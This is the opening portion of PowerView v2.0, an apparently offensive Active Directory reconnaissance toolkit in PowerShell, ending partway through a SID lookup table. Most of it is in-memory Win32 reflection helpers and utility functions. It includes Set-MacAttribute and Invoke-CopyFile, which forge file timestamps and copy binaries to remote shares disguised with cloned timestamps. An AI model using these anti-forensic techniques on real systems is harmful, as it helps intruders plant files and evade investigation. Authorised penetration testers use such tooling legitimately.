#requires -version 2

<#
PowerView v2.0

See README.md for more information.

License: BSD 3-Clause
Author: @harmj0y
#>

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule
{
<#
    .SYNOPSIS

        Creates an in-memory assembly and module

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

        $Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
    .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func

    .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

    .PARAMETER DllName

        The name of the DLL.

    .PARAMETER FunctionName

        The name of the target function.

    .PARAMETER ReturnType

        The return type of the function.

    .PARAMETER ParameterTypes

        The function parameters.

    .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

    .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

    .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

    .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
    .SYNOPSIS

        Creates an in-memory enumeration for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION

        The 'psenum' function facilitates the creation of enums entirely in
        memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

        The in-memory module that will host the enum. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the enum.

    .PARAMETER Type

        The type of each enum element.

    .PARAMETER EnumElements

        A hashtable of enum elements.

    .PARAMETER Bitfield

        Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
            UNKNOWN =                  0
            NATIVE =                   1 # Image doesn't require a subsystem.
            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
            EFI_APPLICATION =          10
            EFI_BOOT_SERVICE_DRIVER =  11
            EFI_RUNTIME_DRIVER =       12
            EFI_ROM =                  13
            XBOX =                     14
            WINDOWS_BOOT_APPLICATION = 16
        }

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
    <#
    .SYNOPSIS

        Creates an in-memory struct for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: field

    .DESCRIPTION

        The 'struct' function facilitates the creation of structs entirely in
        memory using as close to a "C style" as PowerShell will allow. Struct
        fields are specified using a hashtable where each field of the struct
        is comprosed of the order in which it should be defined, its .NET
        type, and optionally, its offset and special marshaling attributes.

        One of the features of 'struct' is that after your struct is defined,
        it will come with a built-in GetSize method as well as an explicit
        converter so that you can easily cast an IntPtr to the struct without
        relying upon calling SizeOf and/or PtrToStructure in the Marshal
        class.

    .PARAMETER Module

        The in-memory module that will host the struct. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the struct.

    .PARAMETER StructFields

        A hashtable of fields. Use the 'field' helper function to ease
        defining each field.

    .PARAMETER PackingSize

        Specifies the memory alignment of fields.

    .PARAMETER ExplicitLayout

        Indicates that an explicit offset for each field will be specified.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
            DOS_SIGNATURE =    0x5A4D
            OS2_SIGNATURE =    0x454E
            OS2_SIGNATURE_LE = 0x454C
            VXD_SIGNATURE =    0x454C
        }

        $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
            e_magic =    field 0 $ImageDosSignature
            e_cblp =     field 1 UInt16
            e_cp =       field 2 UInt16
            e_crlc =     field 3 UInt16
            e_cparhdr =  field 4 UInt16
            e_minalloc = field 5 UInt16
            e_maxalloc = field 6 UInt16
            e_ss =       field 7 UInt16
            e_sp =       field 8 UInt16
            e_csum =     field 9 UInt16
            e_ip =       field 10 UInt16
            e_cs =       field 11 UInt16
            e_lfarlc =   field 12 UInt16
            e_ovno =     field 13 UInt16
            e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
            e_oemid =    field 15 UInt16
            e_oeminfo =  field 16 UInt16
            e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
            e_lfanew =   field 18 Int32
        }

        # Example of using an explicit layout in order to create a union.
        $TestUnion = struct $Mod TestUnion @{
            field1 = field 0 UInt32 0
            field2 = field 1 IntPtr 0
        } -ExplicitLayout

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    ForEach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

function Export-PowerViewCSV {
<#
    .SYNOPSIS

        This function exports to a .csv in a thread-safe manner.
        
        Based partially on Dmitry Sotnikov's Export-CSV code
            at http://poshcode.org/1590

    .LINK

        http://poshcode.org/1590
        http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $InputObject,

        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [System.String]
        $OutFile
    )

    process {
        
        $ObjectCSV = $InputObject | ConvertTo-Csv -NoTypeInformation

        # mutex so threaded code doesn't stomp on the output file
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
        $Null = $Mutex.WaitOne()

        if (Test-Path -Path $OutFile) {
            # hack to skip the first line of output if the file already exists
            $ObjectCSV | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }
        else {
            $ObjectCSV | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }

        $Mutex.ReleaseMutex()
    }
}


# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
function Set-MacAttribute {
<#
    .SYNOPSIS

        Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.

        PowerSploit Function: Set-MacAttribute
        Author: Chris Campbell (@obscuresec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        Version: 1.0.0

    .DESCRIPTION

        Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"

    .LINK

        http://www.obscuresec.com/2014/05/touch.html
#>
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FilePath,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OldFilePath,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )

    #Helper function that returns an object with the MAC attributes of a file.
    function Get-MacAttribute {

        param($OldFileName)

        if (!(Test-Path -Path $OldFileName)) {Throw 'File Not Found'}
        $FileInfoObject = (Get-Item $OldFileName)

        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    }

    #test and set variables
    if (!(Test-Path -Path $FilePath)) {Throw "$FilePath not found"}

    $FileInfoObject = (Get-Item -Path $FilePath)

    if ($PSBoundParameters['AllMacAttributes']) {
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters['OldFilePath']) {

        if (!(Test-Path -Path $OldFilePath)) {Write-Error "$OldFilePath not found."}

        $CopyFileMac = (Get-MacAttribute $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }

    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}

    Return (Get-MacAttribute $FilePath)
}


function Invoke-CopyFile {
<#
    .SYNOPSIS

        Copy a source file to a destination location, matching any MAC
        properties as appropriate.

    .PARAMETER SourceFile

        Source file to copy.

    .PARAMETER DestFile

        Destination file path to copy file to.

    .EXAMPLE

        PS C:\> Invoke-CopyFile -SourceFile program.exe -DestFile \\WINDOWS7\tools\program.exe
        
        Copy the local program.exe binary to a remote location, matching the MAC properties of the remote exe.

    .LINK

        http://obscuresecurity.blogspot.com/2014/05/touch.html
#>

    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )

    # clone the MAC properties
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile

    # copy the file off
    Copy-Item -Path $SourceFile -Destination $DestFile
}


function Get-HostIP {
<#
    .SYNOPSIS

        Takes a hostname and resolves it an IP.

    .DESCRIPTION

        This function resolves a given hostename to its associated IPv4
        address. If no hostname is provided, it defaults to returning
        the IP address of the local host the script be being run on.

    .OUTPUTS

        System.String. The IPv4 address.

    .EXAMPLE

        PS C:\> Get-HostIP -HostName SERVER
        
        Return the IPv4 address of 'SERVER'
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $HostName = ''
    )
    process {
        try {
            # get the IP resolution of this specified hostname
            $Results = @(([net.dns]::GetHostEntry($HostName)).AddressList)

            if ($Results.Count -ne 0) {
                ForEach ($Result in $Results) {
                    # make sure the returned result is IPv4
                    if ($Result.AddressFamily -eq 'InterNetwork') {
                        $Result.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}


function Test-Server {
<#
    .SYNOPSIS

        Tests a connection to a remote server.

    .DESCRIPTION

        This function uses either ping (test-connection) or RPC
        (through WMI) to test connectivity to a remote server.

    .PARAMETER Server

        The hostname/IP to test connectivity to.

    .OUTPUTS

        $True/$False

    .EXAMPLE

        PS C:\> Test-Server -Server WINDOWS7
        
        Tests ping connectivity to the WINDOWS7 server.

    .EXAMPLE

        PS C:\> Test-Server -RPC -Server WINDOWS7
        
        Tests RPC connectivity to the WINDOWS7 server.

    .LINK

        http://gallery.technet.microsoft.com/scriptcenter/Enhanced-Remote-Server-84c63560
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $Server,

        [Switch]
        $RPC
    )

    process {
        if ($RPC) {
            $WMIParameters = @{
                            namespace = 'root\cimv2'
                            Class = 'win32_ComputerSystem'
                            ComputerName = $Name
                            ErrorAction = 'Stop'
                          }
            if ($Credential -ne $Null)
            {
                $WMIParameters.Credential = $Credential
            }
            try
            {
                Get-WmiObject @WMIParameters
            }
            catch {
                Write-Verbose -Message 'Could not connect via WMI'
            }
        }
        # otherwise, use ping
        else {
            Test-Connection -ComputerName $Server -count 1 -Quiet
        }
    }
}


function Convert-NameToSid {
<#
    .SYNOPSIS

        Converts a given user/group name to a security identifier (SID).

    .PARAMETER Name

        The hostname/IP to test connectivity to.

    .PARAMETER Domain

        Specific domain for the given user account, defaults to the current domain.

    .EXAMPLE

        PS C:\> Convert-NameToSid "DEV\dfm"
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        [ValidateNotNullOrEmpty()]
        $Domain
    )
    begin {
        if($Name.contains("\")) {
            # if we get a DOMAIN\user format, auto convert it
            $Domain = $Name.split("\")[0]
            $Name = $Name.split("\")[1]
        }
        elseif(-not $Domain) {
            $Domain = (Get-NetDomain).Name
        }
    }
    process {
        try {
            $obj = (New-Object System.Security.Principal.NTAccount($Domain,$Name))
            $obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose "invalid name: $domain\$name"
            $Null
        }
    }
}


function Convert-SidToName {
<#
    .SYNOPSIS
    
        Converts a security identifier (SID) to a group/user name.

    .PARAMETER SID
    
        The SID to convert.

    .EXAMPLE

        PS C:\> Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $SID2 = $SID.trim('*')

            # try to resolve any built-in SIDs first
            #   from https://support.microsoft.com/en-us/kb/243330
            Switch ($SID2)
            {
                'S-1-0'         { 'Null Authority' }
                'S-1-0-0'       { 'Nobody' }
                'S-1-1'         { 'World Authority' }
                'S-1-1-0'       { 'Everyone' }
                'S-1-2'         { 'Local Authority' }
                'S-1-2-0'       { 'Local' }
                'S-1-2-1'       { 'Console Logon ' }
                'S-1-3'         { 'Creator Authority' }
                'S-1-3-0'       { 'Creator Owner' }
                'S-1-3-1'       { 'Creator Group' }
                'S-1-3-2'       { 'Creator Owner Server' }
                'S-1-3-3'       { 'Creator Group Server' }
                'S-1-3-4'       { 'Owner Rights' }
                'S-1-4'         { 'Non-unique Authority' }
                'S-1-5'         { 'NT Authority' }
                'S-1-5-1'       { 'Dialup' }
                'S-1-5-2'       { 'Network' }
                'S-1-5-3'       { 'Batch' }
                'S-1-5-4'       { 'Interactive' }
                'S-1-5-6'       { 'Service' }
                'S-1-5-7'       { 'Anonymous' }
                'S-1-5-8'       { 'Proxy' }
                'S-1-5-9'       { 'Enterprise Domain Controllers' }
                'S-1-5-10'      { 'Principal Self' }
                'S-1-5-11'      { 'Authenticated Users' }
                'S-1-5-12'      { 'Restricted Code' }
                'S-1-5-13'      { 'Terminal Server Users' }
                'S-1-5-14'      { 'Remote Interactive Logon' }
                'S-1-5-15'      { 'This Organization ' }
                'S-1-5-17'      { 'This Organization ' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-19'      { 'NT Authority' }
                'S-1-5-20'      { 'NT Authority' }
                'S-1-5-80-0'    { 'All Services ' }
                'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                'S-1-5-32-545'  { 'BUILTIN\Users' }
                'S-1-5-32-546'  { 'BUILTIN\Guests' }
                'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                Default { 
